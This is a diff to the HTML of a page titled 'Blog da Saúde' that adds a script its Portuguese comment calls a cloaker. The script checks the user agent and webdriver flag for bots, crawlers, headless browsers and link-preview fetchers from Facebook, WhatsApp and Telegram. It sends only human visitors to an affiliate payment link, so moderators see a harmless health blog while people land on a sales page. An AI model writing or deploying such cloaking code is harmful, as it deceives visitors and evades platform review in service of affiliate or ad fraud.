@@ -5,6 +5,17 @@
     <meta charset="UTF-8">
     <title>Blog da Saúde</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Cloaker leve em JS: só redireciona se for humano (com base em comportamento)
+        document.addEventListener("DOMContentLoaded", function() {
+            const isBot = /bot|crawl|spider|slurp|facebook|preview|whatsapp|telegram/i.test(navigator.userAgent);
+            const isHeadless = navigator.webdriver || false;
+
+            if (!isBot && !isHeadless) {
+                window.location.href = "https://pay.kiwify.com.br/odlMEJ6?afid=HdoEhMwi";
+            }
+        });
+    </script>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f8f8f8; color: #333; }
         .container { max-width: 600px; margin: 50px auto; background: #fff; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
